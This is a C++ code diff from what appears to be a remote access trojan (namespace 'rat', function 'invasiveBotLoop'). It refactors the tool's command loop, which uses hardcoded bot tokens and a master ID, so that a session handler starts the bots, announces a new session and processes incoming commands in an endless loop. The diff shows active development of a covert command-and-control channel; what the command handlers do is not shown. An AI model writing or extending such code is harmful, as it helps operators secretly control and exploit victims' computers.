@@ -29,7 +29,6 @@ int main(void) {
 
 static void invasiveBotLoop() {
     while (true) {
-
         try {
             botLoop();
         } catch (const std::exception& e) {
@@ -47,24 +46,31 @@ static void botLoop(void) {
     DEBUG_LOG("Bot constructing");
     rat::tbot::Bot     bot(TOKEN1_odahimbotzawzum, MASTER_ID);
     rat::tbot::BaseBot backing_bot(TOKEN_ODAHIMBOT , MASTER_ID, 60);
-        
+            
     if (init_message.empty()) {
-        init_message = fmt::format("Bot initialized at: {}", rat::system::getCurrentDateTime());
+        init_message = fmt::format("Session started at: {}", ::rat::system::getCurrentDateTime());
     }
 
-    bot.sendMessage(init_message);
-    backing_bot.sendMessage(fmt::format("{} wait for the session handler to start", init_message));
-    
-    bot.setOffset();
-    
-    rat::handler::Handler session_handler(bot, backing_bot);
-    
+    rat::handler::Handler session_handler;
+
+    session_handler.setMasterId(MASTER_ID);
+    session_handler.initMainBot(TOKEN1_odahimbotzawzum);
+    session_handler.initBackingBot(TOKEN_ODAHIMBOT);
+    session_handler.initCurlClient(3);
+    session_handler.initThreadPools(1, 1 ,1);
+
+    session_handler.bot->sendMessage(init_message);
+
     while (true) {
         try {
-            rat::tbot::Update update = bot.getUpdate();
+            ::rat::tbot::Update update = session_handler.bot->getUpdate();
+            
+            if(_isUpdateEmpty(update)) {
+                ++empty_updates_count; 
+                continue;
+            }
             session_handler.handleUpdate(std::move(update));
 
-            if(_isUpdateEmpty(update)) ++empty_updates_count;
           
             _dynamicSleep(empty_updates_count);
             std::this_thread::sleep_for(std::chrono::milliseconds(sleep_timout_ms));
@@ -90,5 +96,3 @@ static void _dynamicSleep(uint32_t arg_Count) {
     }
     sleep_timout_ms = static_cast<uint32_t>(sleep);
 }
-
-
